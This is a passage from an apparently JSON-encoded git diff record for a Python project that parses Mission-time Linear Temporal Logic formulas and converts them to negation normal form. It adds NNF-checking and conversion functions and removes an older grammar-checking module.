\"]\" and end_interval <= len_s-1):\n+            end_interval = end_interval + 1\n+\n+        interval = Slice(s, begin_interval, end_interval)\n+        alpha = Slice(s, end_interval+1, len_s-1)\n+        return Interval_check(interval) and Nnf_check(alpha)\n+\n+    # '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+    if(Assoc_Prop_conn_check(Slice_char(s, 1))):\n+        begin_array = 2\n+        end_array = len_s-2\n+\n+        array_entry = Slice(s, begin_array+1, end_array-1)\n+        return Slice_char(s, 0) == \"(\" \\\n+            and Slice_char(s, 2) == \"[\" \\\n+            and Nnf_Array_entry_check(array_entry) \\\n+            and Slice_char(s, len_s - 2) == \"]\" \\\n+            and Slice_char(s, len_s - 1) == \")\" \\\n+\n+#   \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019 | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+    if (Slice_char(s, 0) == \"(\" and Slice_char(s, len_s-1) == \")\"):\n+\n+        # Number of '(' in s\n+        left_count = 0\n+        # Number of ')' in s\n+        right_count = 0\n+\n+\n+        #    Parse for binary_conn_index in s\n+\n+        #    When left_count == right_count and s[binary_conn_index] is a binary connective,\n+        #    we are done parsing and have found binary_conn_index.\n+\n+        for binary_conn_index in Range(1, len_s-1, 1):\n+            c = Slice_char(s, binary_conn_index)\n+\n+            if(c == \"(\"):\n+                left_count += 1\n+\n+            if(c == \")\"):\n+                right_count += 1\n+\n+            # Done parsing for binary_conn_index.\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))):\n+                break\n+\n+        binary_conn = Slice_char(s, binary_conn_index)\n+\n+        # \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)):\n+            alpha = Slice(s, 1, binary_conn_index-1)\n+            beta = Slice(s, binary_conn_index+1, len_s-2)\n+            return Nnf_check(alpha) and Nnf_check(beta)\n+\n+        # \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+        if (Binary_Temp_conn_check(binary_conn)):\n+            begin_interval = binary_conn_index+1\n+            end_interval = binary_conn_index+2\n+\n+            # Parse for end of interval\n+            while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1):\n+                end_interval = end_interval + 1\n+\n+            alpha = Slice(s, 1, binary_conn_index-1)\n+            interval = Slice(s, begin_interval, end_interval)\n+            beta = Slice(s, end_interval+1, len_s-2)\n+            return Nnf_check(alpha) and Interval_check(interval) and Nnf_check(beta)\n+\n+    return False\n+\n+\n+\n+#  Converts a WFF to its equivalent NNF.\n+#  A cleaner implementation of Wff_to_Nnf().\n+def Wff_to_Nnf_clean(wff : str):\n+    len_wff = len(wff)\n+\n+    # Determine if first symbol is '~' or not.\n+    if (Slice_char(wff, 0) != \"~\"):\n+        # Prop_var\n+        if (Prop_var_check(wff)):\n+            return wff\n+\n+        # Prop_cons\n+        if (Prop_cons_check(wff)):\n+            return wff\n+\n+        # Unary_Temp_conn Interval wff\n+        if (Unary_Temp_conn_check(Slice_char(wff, 0))):\n+            unary_temp_conn = Slice_char(wff, 0)\n+            interval_tuple = primary_interval(wff)\n+            begin_interval = interval_tuple[0] \n+            end_interval =  interval_tuple[2]\n+            alpha = Slice(wff, end_interval+1, len_wff-1)\n+\n+            # Input: unary_temp_conn Interval alpha\n+            # Return: unary_temp_conn Interval Wff_to_Nnf_clean(alpha)\n+            return unary_temp_conn + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(alpha) \n+\n+        # '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+        if (Assoc_Prop_conn_check(Slice_char(wff, 1))):\n+            # Parse through '[' wff_1 ',' wff_2 ',' ... ',' wff_n ']' entry-by-entry\n+            # and iteratively compute: return_string = '(' Assoc_Prop_conn '[' Wff_to_Nnf_clean(wff_1) ',' ... ',' Wff_to_Nnf_clean(wff_n) ']' ')'\n+            begin_entry = 3\n+            return_string = Slice(wff, 0, 2) \n+            for end_entry in Range(3, len_wff-1, 1):\n+                if (Wff_check(Slice(wff, begin_entry, end_entry))):\n+                    alpha = Slice(wff, begin_entry, end_entry)\n+                    \n+                    # Add Wff_to_Nnf_clean(alpha) to return string\n+                    return_string = return_string + Wff_to_Nnf_clean(alpha) + \",\"\n+\n+                    # Update begin_entry so it has index of the first char of the next entry.\n+                    begin_entry = end_entry + 2\n+\n+            # Remove extra comma at right end\n+            return_string = Slice(return_string, 0, len(return_string)-2)\n+\n+            # Input: '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+            # Return: '(' Assoc_Prop_conn '[' Wff_to_Nnf_clean(wff_1) ',' ... ',' Wff_to_Nnf_clean(wff_n) ']' ')'\n+            return_string = return_string + \"])\"\n+            return return_string\n+\n+        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)    \n+        binary_conn_index = primary_binary_conn(wff)\n+        binary_conn = Slice_char(wff, binary_conn_index)\n+\n+        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)):\n+            alpha = Slice(wff, 1, binary_conn_index-1)\n+            beta = Slice(wff, binary_conn_index+1, len_wff-2)\n+\n+            # Input: '(' alpha binary_conn beta ')' \n+            # Return: '(' Wff_to_Nnf_clean(alpha) + binary_conn + Wff_to_Nnf_clean(beta)\n+            return \"(\" + Wff_to_Nnf_clean(alpha) + binary_conn + Wff_to_Nnf_clean(beta) + \")\"\n+\n+        # \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+        if (Binary_Temp_conn_check(binary_conn)):\n+            interval_tuple = primary_interval(wff)\n+            begin_interval = interval_tuple[0]\n+            end_interval = interval_tuple[2]\n+\n+            alpha = Slice(wff, 1, binary_conn_index-1)\n+            beta = Slice(wff, end_interval+1, len_wff-2)\n+\n+            # Input: \u2018(\u2018 alpha binary_conn  Interval beta \u2018)'  \n+            # Return: '(' Wff_to_Nnf_clean(alpha) binary_conn Interval Wff_to_Nnf_clean(beta) ')'\n+            return \"(\" + Wff_to_Nnf_clean(alpha) + binary_conn + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(beta) + \")\"\n+\n+    # Slice_char(wff, 0) == \"~\"\n+    if (Slice_char(wff, 0) == \"~\"):\n+        # '~' Prop_var\n+        if (Prop_var_check(Slice(wff, 1, len_wff-1))):\n+            return wff\n+\n+        # '~' Prop_cons\n+        if (Prop_cons_check(Slice(wff, 1, len_wff-1))):\n+            # Prop_cons -> 'T'\n+            if (Slice(wff, 1, len_wff-1) == \"T\"):\n+                return \"!\"\n+\n+            # Prop_cons -> '!'\n+            if (Slice(wff, 1, len_wff-1) == \"!\"):\n+                return \"T\"\n+\n+        # '~' Unary_Prop_conn Wff\n+        if (Unary_Prop_conn_check(Slice_char(wff, 1))):\n+            alpha = Slice(wff, 2, len_wff-1)\n+            return Wff_to_Nnf_clean(alpha)\n+\n+        # '~' Unary_Temp_conn  Interval  Wff\n+        if (Unary_Temp_conn_check(Slice_char(wff, 1))):\n+            unary_temp_conn = Slice_char(wff, 1)\n+\n+            interval_tuple = primary_interval(Slice(wff, 1, len_wff-1))\n+            # Add 1 to every entry of interval tuple to accomodate sliced-off '~' char.\n+            interval_tuple = ((interval_tuple[0]) + 1, (interval_tuple[1]) + 1, (interval_tuple[2]) + 1)\n+\n+            begin_interval = interval_tuple[0]\n+            end_interval = interval_tuple[2]\n+            alpha =  Slice(wff, end_interval+1, len_wff-1)\n+\n+            # Switch 'F', 'G' with corresponding dual: 'G', 'F'\n+            if (unary_temp_conn == \"F\"):\n+                unary_temp_conn = \"G\"\n+            elif (unary_temp_conn == \"G\"):\n+                unary_temp_conn = \"F\"\n+\n+            # Input: '~' unary_Temp_conn  Interval  alpha \n+            # Return: dual(unary_Temp_conn) Interval Wff_to_Nnf_clean(\"~\" + alpha)\n+            return unary_temp_conn + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(\"~\" + alpha)\n+\n+        # '~' \u2018(\u2018 Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 \u2018)\u2019\n+        if (Assoc_Prop_conn_check(Slice_char(wff, 2))):\n+            assoc_prop_conn = Slice_char(wff, 2)\n+\n+            # ~ (...((wff_1 assoc_prop_conn wff_2) assoc_prop_conn wff_3) ... assoc_prop_conn wff_n)\n+            # is equiv to ~(assoc_prop_conn [wff_1, ..., wff_n])\n+            begin_entry = 4\n+            equiv_formula = \"\" \n+            for end_entry in Range(4, len_wff-1, 1):\n+                if (Wff_check(Slice(wff, begin_entry, end_entry))):   \n+                    alpha = Slice(wff, begin_entry, end_entry)\n+                    \n+                    # First entry obtained\n+                    if (begin_entry == 4):\n+                        # Add wff_1 to equiv_formula\n+                        equiv_formula = equiv_formula + alpha\n+\n+                    # Not first entry\n+                    else:\n+                        # Add wff_n to equiv_formula, where n >= 2\n+                        equiv_formula = \"(\" + equiv_formula + assoc_prop_conn + alpha + \")\"\n+\n+                    # Update begin_entry so it has index of the first char of the next entry.\n+                    begin_entry = end_entry + 2\n+\n+            # Add on \"~\" on front\n+            equiv_formula = \"~\" + equiv_formula\n+            \n+            return Wff_to_Nnf_clean(equiv_formula)\n+\n+        # '~' \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | '~' \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+        # Add 1 to accomodate for sliced-off '~'    \n+        binary_conn_index = primary_binary_conn(Slice(wff, 1, len_wff-1)) + 1\n+        binary_conn = Slice_char(wff, binary_conn_index)\n+\n+        # '~' \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)):\n+            # '~' \u2018(\u2018 Wff 'v' Wff \u2018)\u2019 | '~' \u2018(\u2018 Wff '&' Wff \u2018)\n+            if (binary_conn == \"v\" or binary_conn == \"&\"): \n+\n+                # Switch 'v', '&' with corresponding dual: '&', 'v'\n+                if (binary_conn == \"v\"):\n+                    binary_conn = \"&\"\n+                elif (binary_conn == \"&\"):\n+                    binary_conn = \"v\"\n+\n+                nega_alpha = \"~\" + Slice(wff, 2, binary_conn_index-1)\n+                nega_beta = \"~\" + Slice(wff, binary_conn_index+1, len_wff-2)\n+                return \"(\" + Wff_to_Nnf_clean(nega_alpha) + binary_conn + Wff_to_Nnf_clean(nega_beta) + \")\"\n+\n+            # '~' \u2018(\u2018 Wff '=' Wff ')'\n+            if (binary_conn == \"=\"):\n+                alpha = Slice(wff, 2, binary_conn_index-1)\n+                beta = Slice(wff, binary_conn_index+1, len_wff-2)\n+                nega_alpha = \"~\" + alpha\n+                nega_beta = \"~\" + beta\n+\n+                # Input: '~' \u2018(\u2018 alpha '=' beta ')'\n+                # Return: \"((\" + Wff_to_Nnf_clean(alpha) + \"v\" + Wff_to_Nnf_clean(beta) \")\"\n+                # + \"&\" + \"(\" \"Wff_to_Nnf_clean(neg_alpha)\" + \"v\" + \"Wff_to_Nnf_clean(neg_beta)\" \"))\"\n+                return \"((\" + Wff_to_Nnf_clean(alpha) + \"v\" + Wff_to_Nnf_clean(beta) + \")\" + \"&\" + \"(\" + Wff_to_Nnf_clean(nega_alpha) + \"v\" + Wff_to_Nnf_clean(nega_beta) + \"))\"\n+\n+            # '~' '(' Wff '>' Wff ')'\n+            if (binary_conn == \">\"):\n+                alpha = Slice(wff, 2, binary_conn_index-1)\n+                beta = Slice(wff, binary_conn_index+1, len_wff-2)\n+                neg_beta = \"~\" + beta\n+\n+                # Input: \"~(\" + alpha + \">\" + beta \")\"\n+                # Return: \"(\" + Wff_to_Nnf_clean(alpha) + \"&\" + Wff_to_Nnf_clean(neg_beta) + \")\"\n+                return \"(\" + Wff_to_Nnf_clean(alpha) + \"&\" + Wff_to_Nnf_clean(neg_beta) + \")\"\n+\n+\n+        #'~' \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+        if (Binary_Temp_conn_check(binary_conn)):\n+            interval_tuple = primary_interval(Slice(wff, 1, len_wff-1))\n+            # Add 1 to accomodate for sliced-off '~' \n+            start_interval = interval_tuple[0] + 1\n+            end_interval = interval_tuple[2] + 1\n+            if (binary_conn == \"U\" or binary_conn == \"R\"): \n+                \n+                # Binary_Temp_conn -> \u2018U\u2019 | \u2018R\u2019\n+                # Switch 'U', 'R' with corresponding dual: 'R', 'U'\n+                if (binary_conn == \"U\"):\n+                    binary_conn = \"R\"\n+                elif (binary_conn == \"R\"):\n+                    binary_conn = \"U\"\n+\n+                neg_alpha = \"~\" + Slice(wff, 2, binary_conn_index-1)\n+                neg_beta = \"~\" + Slice(wff, end_interval+1, len_wff-2)\n+\n+                # Input: \"~(\" + alpha + binary_conn + beta + \")\"\n+                # Return: \"(\" + Wff_to_Nnf_clean(neg_alpha) + dual(binary_conn) \n+                #          + interval + Wff_to_Nnf_clean(neg_beta) + \")\"\n+                return \"(\" + Wff_to_Nnf_clean(neg_alpha) + binary_conn \\\n+                    + Slice(wff, start_interval, end_interval) + Wff_to_Nnf_clean(neg_beta) + \")\"\n+\n+    else:\n+        error_string = wff + \" is not a well-formed formula.\\n\"\n+        raise Exception(error_string)\ndiff --git a\/MLTL_brute_forcer\/output.txt b\/MLTL_brute_forcer\/Python\/output.txt\nsimilarity index 100%\nrename from MLTL_brute_forcer\/output.txt\nrename to MLTL_brute_forcer\/Python\/output.txt\ndiff --git a\/MLTL_brute_forcer\/true_output.txt b\/MLTL_brute_forcer\/Python\/true_output.txt\nsimilarity index 100%\nrename from MLTL_brute_forcer\/true_output.txt\nrename to MLTL_brute_forcer\/Python\/true_output.txt\n","files":{"\/MLTL_brute_forcer\/MLTL_wff.py":{"changes":[{"diff":"\n-from Custom_notation import *\n-\n-\"\"\"\n-This file implements the following Context-Free Grammar\n-for a well-formed formula for MLTL:\n-\n-Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n-Num  ->  Digit Num |  Digit\n-Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n-Prop_var  ->  \u2018p\u2019 Num\n-\n-Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019\n-Unary_Prop_conn  ->  \u2018~\u2019\n-Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n-\n-Temp_cons  ->  \u2018S\u2019\n-Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\n-Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\n-\n-\n-Wff  ->  Prop_var | Prop_cons | Temp_cons\n-                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n-                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\u2019\n-\n-\n-\n-The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.\n-The Unary Prop connective: Negation is represented by: \u2018~\u2019.\n-The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.\n-\n-The Temp constant: Start is represented by: \u2018S\u2019.\n-The Unary Temp connectives: Next, Eventually, Always are represented by: \u2018N\u2019, \u2018E\u2019, \u2018A\u2019.\n-The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018W\u2019.\n-\n-\"\"\"\n-\n-\n-# Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n-def Digit_check(s):\n-    return s == '0' or s == '1' or s == '2' or s == '3' or s == '4' or s == '5' or s == '6' or s == '7' or s == '8' or s == '9'\n-\n-\n-# Num  ->  Digit Num |  Digit\n-def Num_check(s):\n-    len_s = len(s)\n-    if (len_s == 1):\n-        return Digit_check(s)\n-\n-    char = Slice_char(s, 0)\n-    alpha = Slice(s, 1, len_s-1)\n-    return Digit_check(char) and Num_check(alpha)\n-\n-\n-# Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n-def Interval_check(s):\n-    len_s = len(s)\n-\n-    left_bracket = Slice_char(s, 0)\n-    right_bracket = Slice_char(s, len_s-1)\n-\n-    # Parse for comma index\n-    comma_index = 1\n-    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1):\n-        comma_index = comma_index + 1\n-\n-    num_1 = Slice(s, 1, comma_index-1)\n-    comma = Slice_char(s, comma_index)\n-    num_2 = Slice(s, comma_index+1, len_s-2)\n-    return left_bracket == '[' and Num_check(num_1) and comma == ',' and Num_check(num_2) and right_bracket == ']'\n-\n-\n-# Prop_var  ->  \u2018p\u2019 Num\n-def Prop_var_check(s):\n-    len_s = len(s)\n-\n-    char = Slice_char(s, 0)\n-    alpha = Slice(s, 1, len_s-1)\n-    return char == 'p' and Num_check(alpha)\n-\n-\n-# Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019\n-def Prop_cons_check(s):\n-    return s == 'T' or s == 'F'\n-\n-\n-# Unary_Prop_conn  ->  \u2018~\u2019\n-def Unary_Prop_conn_check(s):\n-    return s == '~'\n-\n-\n-# Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n-def Binary_Prop_conn_check(s):\n-    return s == 'v' or s == '&' or s == '=' or s == '>'\n-\n-\n-# Temp_cons  ->  \u2018S\u2019\n-def Temp_cons_check(s):\n-    return s == 'S'\n-\n-# Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\n-def Unary_Temp_conn_check(s):\n-    return s == 'E' or s == 'A'\n-\n-\n-# Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\n-def Binary_Temp_conn_check(s):\n-    return s == 'U' or s == 'W'\n-\n-\n-\n-# Wff  ->  Prop_var | Prop_cons | Temp_cons\n-#                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n-#                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\u2019\n-\n-def Wff_check(s):\n-    len_s = len(s)\n-\n-    # Prop_var | Prop_cons | Temp_cons\n-    if (Prop_var_check(s) or Prop_cons_check(s) or Temp_cons_check(s)):\n-        return True\n-\n-    # Unary_Prop_conn Wff\n-    if (Unary_Prop_conn_check(Slice_char(s, 0))):\n-        alpha = Slice(s, 1, len_s-1)\n-        return  Wff_check(alpha)\n-\n-    # Unary_Temp_conn  Interval  Wff\n-    if (Unary_Temp_conn_check(Slice_char(s, 0))):\n-        begin_interval = 1\n-        end_interval = 2\n-\n-        # Parse for end of interval\n-        while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n-            end_interval = end_interval + 1\n-\n-        interval = Slice(s, begin_interval, end_interval)\n-        alpha = Slice(s, end_interval+1, len_s-1)\n-        return Interval_check(interval) and Wff_check(alpha)\n-\n-    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-    if (Slice_char(s, 0) == '(' and Slice_char(s, len_s-1) == ')'):\n-\n-        # Number of '(' in s\n-        left_count = 0\n-        # Number of ')' in s\n-        right_count = 0\n-\n-\n-        #    Parse for binary_conn_index in s\n-\n-        #    When left_count == right_count and s[binary_conn_index] is a binary connective,\n-        #    we are done parsing and have found binary_conn_index.\n-\n-        for binary_conn_index in Range(1, len_s-1, 1):\n-            char = Slice_char(s, binary_conn_index)\n-\n-            if(char == '('):\n-                left_count = left_count + 1\n-\n-            if(char == ')'):\n-                right_count = right_count + 1\n-\n-            # Done parsing for binary_conn_index.\n-            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n-                break\n-\n-        binary_conn = Slice_char(s, binary_conn_index)\n-\n-        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n-        if (Binary_Prop_conn_check(binary_conn)):\n-            alpha = Slice(s, 1, binary_conn_index-1)\n-            beta = Slice(s, binary_conn_index+1, len_s-2)\n-            return Wff_check(alpha) and Wff_check(beta)\n-\n-        # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-        if (Binary_Temp_conn_check(binary_conn)):\n-            begin_interval = binary_conn_index+1\n-            end_interval = binary_conn_index+2\n-\n-            # Parse for end of interval\n-            while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n-                end_interval = end_interval + 1\n-\n-            alpha = Slice(s, 1, binary_conn_index-1)\n-            interval = Slice(s, begin_interval, end_interval)\n-            beta = Slice(s, end_interval+1, len_s-2)\n-            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta)\n-\n-    return False\n-\n-\n-# Given a well-formed MLTL formula wff,\n-# return the index of the primary binary connective.\n-# If this does not occur, return -1.\n-def primary_binary_conn(wff):\n-    len_wff = len(wff)\n-\n-    if (Slice_char(wff, 0) == '(' and Slice_char(wff, len_wff-1) == ')'):\n-        left_count = 0\n-        right_count = 0\n-\n-        for binary_conn_index in Range(1, len_wff-1, 1):\n-            char = Slice_char(wff, binary_conn_index)\n-\n-            if(char == '('):\n-                left_count = left_count + 1\n-\n-            if(char == ')'):\n-                right_count = right_count + 1\n-\n-            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n-                break\n-\n-        return binary_conn_index\n-\n-    return -1\n-\n-\n-# Given a well-formed MLTL formula wff,\n-# return the tuple (begin_interval, comma_index, end_interval), giving the indexs\n-# for the primary interval occuring in the formula.\n-# This makes parsing for the temporal indexs easy.\n-#\n-# If there is no primary interval for the formula, return -1.\n-def primary_interval(wff):\n-    len_wff = len(wff)\n-\n-    # Unary_Temp_conn  Interval  Wff\n-    if (Unary_Temp_conn_check(Slice_char(wff, 0))):\n-        begin_interval = 1\n-\n-        # Parse for comma_index\n-        comma_index = begin_interval+1\n-        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n-            comma_index = comma_index+1\n-\n-        # Parse for end_interval\n-        end_interval = comma_index+1\n-        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n-            end_interval = end_interval + 1\n-\n-        return (begin_interval, comma_index, end_interval)\n-\n-\n-    # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n-    binary_conn_index = primary_binary_conn(wff)\n-    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))):\n-        begin_interval = binary_conn_index+1\n-\n-        # Parse for comma_index\n-        comma_index = begin_interval+1\n-        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n-            comma_index = comma_index+1\n-\n-        # Parse for end_interval\n-        end_interval = comma_index+1\n-        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n-            end_interval = end_interval + 1\n-\n-        return (begin_interval, comma_index, end_interval)\n-\n-\n-    return -1\n-\n-\n-\n-\n-# Test Wff_check, primary_binary_conn, and primary_interval functions.\n-if __name__ == \"__main__\":\n-    wff = input (\"Enter MLTL formula : \")\n-    wff = strip_whitespace(wff)\n-    assert (Wff_check(wff)), \"Not a well-formed formula\"\n-\n-    print(\"primary_binary_conn: \" + str(primary_binary_conn(wff)))\n-    print(\"primary_interval: \" + str(primary_interval(wff)))","add":0,"remove":275,"filename":"\/MLTL_brute_forcer\/MLTL_wff.py","badparts":["from Custom_notation import *","\"\"\"","This file implements the following Context-Free Grammar","for a well-formed formula for MLTL:","Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019","Num  ->  Digit Num |  Digit","Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019","Prop_var  ->  \u2018p\u2019 Num","Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019","Unary_Prop_conn  ->  \u2018~\u2019","Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019","Temp_cons  ->  \u2018S\u2019","Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019","Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019","Wff  ->  Prop_var | Prop_cons | Temp_cons","                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff","                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\u2019","The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.","The Unary Prop connective: Negation is represented by: \u2018~\u2019.","The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.","The Temp constant: Start is represented by: \u2018S\u2019.","The Unary Temp connectives: Next, Eventually, Always are represented by: \u2018N\u2019, \u2018E\u2019, \u2018A\u2019.","The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018W\u2019.","\"\"\"","def Digit_check(s):","    return s == '0' or s == '1' or s == '2' or s == '3' or s == '4' or s == '5' or s == '6' or s == '7' or s == '8' or s == '9'","def Num_check(s):","    len_s = len(s)","    if (len_s == 1):","        return Digit_check(s)","    char = Slice_char(s, 0)","    alpha = Slice(s, 1, len_s-1)","    return Digit_check(char) and Num_check(alpha)","def Interval_check(s):","    len_s = len(s)","    left_bracket = Slice_char(s, 0)","    right_bracket = Slice_char(s, len_s-1)","    comma_index = 1","    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1):","        comma_index = comma_index + 1","    num_1 = Slice(s, 1, comma_index-1)","    comma = Slice_char(s, comma_index)","    num_2 = Slice(s, comma_index+1, len_s-2)","    return left_bracket == '[' and Num_check(num_1) and comma == ',' and Num_check(num_2) and right_bracket == ']'","def Prop_var_check(s):","    len_s = len(s)","    char = Slice_char(s, 0)","    alpha = Slice(s, 1, len_s-1)","    return char == 'p' and Num_check(alpha)","def Prop_cons_check(s):","    return s == 'T' or s == 'F'","def Unary_Prop_conn_check(s):","    return s == '~'","def Binary_Prop_conn_check(s):","    return s == 'v' or s == '&' or s == '=' or s == '>'","def Temp_cons_check(s):","    return s == 'S'","def Unary_Temp_conn_check(s):","    return s == 'E' or s == 'A'","def Binary_Temp_conn_check(s):","    return s == 'U' or s == 'W'","def Wff_check(s):","    len_s = len(s)","    if (Prop_var_check(s) or Prop_cons_check(s) or Temp_cons_check(s)):","        return True","    if (Unary_Prop_conn_check(Slice_char(s, 0))):","        alpha = Slice(s, 1, len_s-1)","        return  Wff_check(alpha)","    if (Unary_Temp_conn_check(Slice_char(s, 0))):","        begin_interval = 1","        end_interval = 2","        while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):","            end_interval = end_interval + 1","        interval = Slice(s, begin_interval, end_interval)","        alpha = Slice(s, end_interval+1, len_s-1)","        return Interval_check(interval) and Wff_check(alpha)","    if (Slice_char(s, 0) == '(' and Slice_char(s, len_s-1) == ')'):","        left_count = 0","        right_count = 0","        for binary_conn_index in Range(1, len_s-1, 1):","            char = Slice_char(s, binary_conn_index)","            if(char == '('):","                left_count = left_count + 1","            if(char == ')'):","                right_count = right_count + 1","            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):","                break","        binary_conn = Slice_char(s, binary_conn_index)","        if (Binary_Prop_conn_check(binary_conn)):","            alpha = Slice(s, 1, binary_conn_index-1)","            beta = Slice(s, binary_conn_index+1, len_s-2)","            return Wff_check(alpha) and Wff_check(beta)","        if (Binary_Temp_conn_check(binary_conn)):","            begin_interval = binary_conn_index+1","            end_interval = binary_conn_index+2","            while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):","                end_interval = end_interval + 1","            alpha = Slice(s, 1, binary_conn_index-1)","            interval = Slice(s, begin_interval, end_interval)","            beta = Slice(s, end_interval+1, len_s-2)","            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta)","    return False","def primary_binary_conn(wff):","    len_wff = len(wff)","    if (Slice_char(wff, 0) == '(' and Slice_char(wff, len_wff-1) == ')'):","        left_count = 0","        right_count = 0","        for binary_conn_index in Range(1, len_wff-1, 1):","            char = Slice_char(wff, binary_conn_index)","            if(char == '('):","                left_count = left_count + 1","            if(char == ')'):","                right_count = right_count + 1","            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):","                break","        return binary_conn_index","    return -1","def primary_interval(wff):","    len_wff = len(wff)","    if (Unary_Temp_conn_check(Slice_char(wff, 0))):","        begin_interval = 1","        comma_index = begin_interval+1","        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):","            comma_index = comma_index+1","        end_interval = comma_index+1","        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):","            end_interval = end_interval + 1","        return (begin_interval, comma_index, end_interval)","    binary_conn_index = primary_binary_conn(wff)","    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))):","        begin_interval = binary_conn_index+1","        comma_index = begin_interval+1","        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):","            comma_index = comma_index+1","        end_interval = comma_index+1","        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):","            end_interval = end_interval + 1","        return (begin_interval, comma_index, end_interval)","    return -1","if __name__ == \"__main__\":","    wff = input (\"Enter MLTL formula : \")","    wff = strip_whitespace(wff)","    assert (Wff_check(wff)), \"Not a well-formed formula\"","    print(\"primary_binary_conn: \" + 